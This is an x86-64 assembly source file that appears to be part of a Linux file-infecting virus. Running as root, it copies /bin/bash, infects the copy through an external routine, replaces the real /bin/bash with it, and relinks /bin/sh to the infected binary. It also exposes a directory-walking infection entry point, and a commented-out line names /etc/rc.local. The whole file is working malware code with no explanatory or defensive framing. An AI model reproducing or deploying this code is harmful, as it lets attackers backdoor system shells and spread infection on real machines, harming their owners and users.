section .text
    global _start_infect
    global _infect_from_root
    extern _final_end
    extern _string
    extern _treat_file
    extern _read_dir

;_rc_local:
;    .string db '/etc/rc.local', 0
;    .len equ $ - _rc_local.string

_bin_bash:
    .string db '/bin/bash', 0

_symlink:
    .string db '/bin/sh', 0

_start_infect: ; (rdi: env addr)
    enter 24, 0
	mov rax, 107
	syscall ; We call geteuid
	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect /etc/rc.local
	jne _ret
    call _copy_infect_unlink_rename
; now /bin/bash is the infected version of /bin/bash
; so we unlink /bin/sh
    mov rax, 87
    lea rdi, [rel _symlink]
    syscall
; and then we create our symbolic link: /bin/sh -> /bin/bash
    mov rax, 88
    lea rsi, [rel _symlink]
    lea rdi, [rel _bin_bash]
    syscall

_exit_properly:
    mov rax, 60
    mov rdi, 0
    syscall

_ret:
    leave
    ret

_infect_from_root:
    enter 16, 0
    mov rax, 0
    push rax
    mov rax, 1
    push rax
    mov rax, rsp
    add rax, 8
    push rax
    push rax
    call _read_dir
    jmp _exit_properly

_new_bash:
    .string db '/bin/test', 0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; We can't directly infect /bin/bash, so we do tricky move:
; Here we will open /bin/bash in READ_ONLY mod.
; Then we will read the file, and write it in /bin/test, opened in read|write
; and we infect /bin/test.
; When it's done, we unlink /bin/bash, and rename /bin/test to /bin/bash.
; So the new /bin/bash is an infected copy of /bin/bash.

_copy_infect_unlink_rename:
    enter 280, 0 ; 256(buffer) + 8(fd /bin/bash) + 8(fd /bin/test) + 8(int result of read) + 16(pading)
; open /bin/bash
    mov rax, 2
    lea rdi, [rel _bin_bash]
    mov rsi, 0
    syscall
    cmp rax, 0
    jle _exit_copy
; store fd in stack
    mov QWORD [rsp + 256], rax
; open /bin/test
    mov rax, 2
    lea rdi, [rel _new_bash]
    mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
    mov rdx, 493 ; S_IRWXU | S_IRGRP | S_IROTH | S_IXGRP | S_IXOTH
    syscall
    cmp rax, 0
    jle _exit_copy
    mov QWORD [rsp + 264], rax
    mov QWORD [rsp + 272], 0
_loop_read_write: ; read from /bin/bash 256 bytes
    mov rax, 0
    mov rdi, QWORD [rsp + 256]
    mov rsi, rsp
    mov rdx, 256
    syscall
    mov QWORD [rsp + 272], rax ; store the number of bytes readed
_write_it: ; write the bytes readed to /bin/test
    mov rax, 1
    mov rdi, QWORD [rsp + 264]
    mov rsi, rsp
    mov rdx, QWORD [rsp + 272]
    syscall
_verify: ; check if the number of bytes is equal 256. if not, we are at end of file
    cmp QWORD [rsp + 272], 256
    je _loop_read_write

_unlink:
; close /bin/bash and /bin/test
    mov rax, 3
    mov rdi, QWORD [rsp + 256]
    syscall
    mov rax, 3
    mov rdi, QWORD [rsp + 264]
    syscall
; store /bin and test on stack
    mov rax, 0x0000000074736574 ; test
    push rax
    mov rax, 0x000000006e69622f ; /bin
    push rax
; take their address
    mov rdi, rsp
    add rdi, 8
; calcul virus size
	xor r10, r10 ; r10 = 0
	lea r10, [rel _final_end] ; r10 = &_final_end
	add r10, 2 ; final_end have 2 bytes of instrucitions
	xor r11, r11
	lea r11, [rel _string] ; r11 = &_string
	sub r10, r11 ; &_final_end -= &_string
	mov rsi, r10 ; virus size = r10
    mov rdx, rsp
    mov r10, 0
    call _treat_file ; we treat our /bin/test
    pop rdi
    pop rdi
; now we unlink /bin/bash
    mov rax, 87
    lea rdi, [rel _bin_bash.string]
    syscall
    cmp rax, 0
    jne _exit_copy
; and we rename /bin/test to /bin/bash
    mov rax, 82
    lea rdi, [rel _new_bash.string]
    lea rsi, [rel _bin_bash.string]
    syscall
    cmp rax, 0
_exit_copy:
    leave
    ret
